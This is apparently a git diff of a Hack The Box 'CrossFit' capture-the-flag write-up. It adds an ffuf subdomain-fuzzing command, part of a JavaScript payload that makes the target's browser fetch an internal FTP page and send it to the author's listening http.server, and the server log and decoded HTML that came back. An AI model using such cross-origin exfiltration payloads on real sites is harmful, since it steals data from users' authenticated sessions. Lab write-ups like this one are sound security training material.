@@ -273,6 +273,8 @@ In the same spirit I tried to get the admin to download a PHP shell from me, and
 
 Origin Header with Access-Control-Allow-Origin response header
 
+### ftp.crossfit.htb
+
 ```bash
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ ffuf -t 25 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://10.10.10.208 -H 'Origin: http://FUZZ.crossfit.htb' -mr 'Allow-Origin'               
@@ -306,9 +308,7 @@ found ftp.crossfit.htb
 
 ![](../../.gitbook/assets/2-ftb-apache.png)
 
-Led to another default Apache page
-
-
+Led to another default Apache page.  Next I decided to see if I could use the same Cross Origin Request Forgery to get the headers of the internal FTP page.  
 
 [https://stackoverflow.com/questions/247483/http-get-request-in-javascript](https://stackoverflow.com/questions/247483/http-get-request-in-javascript)
 
@@ -325,6 +325,60 @@ var request2 = new XMLHttpRequest();
 //send response1 to my waiting python http.server 
 request2.open('GET', 'http://10.10.14.161:8090/' + response1, true);
 request2.send()
+```
+
+I wrote a javascript payload to reach out to the ftp site, then send the response back to my python http.server. 
+
+```text
+┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+└─$ python3 -m http.server 8090                                      
+Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
+10.10.10.208 - - [21/Mar/2021 18:21:03] "GET /test.js HTTP/1.1" 200 -
+10.10.10.208 - - [21/Mar/2021 18:24:34] "GET /test.js HTTP/1.1" 200 -
+10.10.10.208 - - [21/Mar/2021 18:28:05] "GET /test.js HTTP/1.1" 200 -
+10.10.10.208 - - [21/Mar/2021 18:28:05] code 404, message File not found
+10.10.10.208 - - [21/Mar/2021 18:28:05] "GET /%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%20%20%20%20%3Ctitle%3EFTP%20Hosting%20-%20Account%20Management%3C/title%3E%20%20%20%20%3Clink%20href=%22https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css%22%20rel=%22stylesheet%22%3E%3C/head%3E%3Cbody%3E%3Cbr%3E%3Cdiv%20class=%22container%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22row%22%3E%20%20%20%20%20%20%20%20%3Cdiv%20class=%22col-lg-12%20margin-tb%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-left%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch2%3EFTP%20Hosting%20-%20Account%20Management%3C/h2%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class=%22pull-right%22%3E%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class=%22btn%20btn-success%22%20href=%22http://ftp.crossfit.htb/accounts/create%22%3E%20Create%20New%20Account%3C/a%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3C/div%3E%20%20%20%20%3C/div%3E%20%20%20%20%20%20%20%20%3Ctable%20class=%22table%20table-bordered%22%3E%20%20%20%20%20%20%20%20%3Ctr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ENo%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3EUsername%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%3ECreation%20Date%3C/th%3E%20%20%20%20%20%20%20%20%20%20%20%20%3Cth%20width=%22280px%22%3EAction%3C/th%3E%20%20%20%20%20%20%20%20%3C/tr%3E%20%20%20%20%20%20%20%20%20%20%20%20%3C/table%3E%20%20%20%20%3C/div%3E%3C/body%3E%3C/html%3E HTTP/1.1" 404 -
+```
+
+It took me a few tries, but I was able to get the server to download my script and execute it.
+
+```markup
+<!DOCTYPE html>
+<html>
+<head>    
+    <title>FTP Hosting - Account Management</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-alpha/css/bootstrap.css" rel="stylesheet">
+</head>
+<body>
+<br>
+<div class="container">        
+    <div class="row">        
+      <div class="col-lg-12 margin-tb">            
+        <div class="pull-left">
+                    
+        <h2>FTP Hosting - Account Management</h2>
+                    
+        </div>
+                
+        <div class="pull-right">                
+        <a class="btn btn-success" href="http://ftp.crossfit.htb/accounts/create"> Create New Account</a>            
+        </div>
+                
+      </div>    
+    </div>
+            
+    <table class="table table-bordered">        
+      <tr>            
+        <th>No</th>            
+        <th>Username</th>            
+        <th>Creation Date</th>            
+        <th width="280px">Action</th>        
+      </tr>            
+    </table>
+        
+</div>
+</body>
+</html>
 ```
 
 wrote payload to create new ftp user
